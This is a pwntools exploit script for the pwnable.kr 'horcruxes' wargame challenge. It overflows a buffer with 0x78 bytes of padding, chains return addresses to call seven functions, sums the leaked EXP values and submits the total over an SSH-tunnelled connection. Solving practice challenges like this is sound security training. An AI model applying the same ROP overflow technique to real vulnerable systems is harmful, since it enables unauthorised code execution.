from pwn import *

A = 0x0809fe4b
B = 0x0809fe6a
C = 0x0809fe89
D = 0x0809fea8
E = 0x0809fec7
F = 0x0809fee6
G = 0x0809ff05
call_ropme = 0x0809fffc



context(arch='i386')

payload = 'a'*0x78 + flat([A, B, C, D, E, F, G, call_ropme])


s = ssh(host='pwnable.kr', user='horcruxes', password='guest', port=2222)
r = s.remote('localhost', 9032)
#r = process('./horcruxes')

#gdb.attach(proc.pidof(r)[0])

r.recvuntil('Menu:')
r.sendline('1')
r.recvuntil('? : ')
r.sendline(payload)

Sum = 0
for _ in range(7):
	r.recvuntil('EXP +')
	exp = r.recvline()[:-2]
	Sum += int(exp)

Sum = Sum%2147483648

r.recvuntil('Menu:')
r.sendline('1')
r.recvuntil('? : ')
r.sendline(str(Sum))

r.interactive()
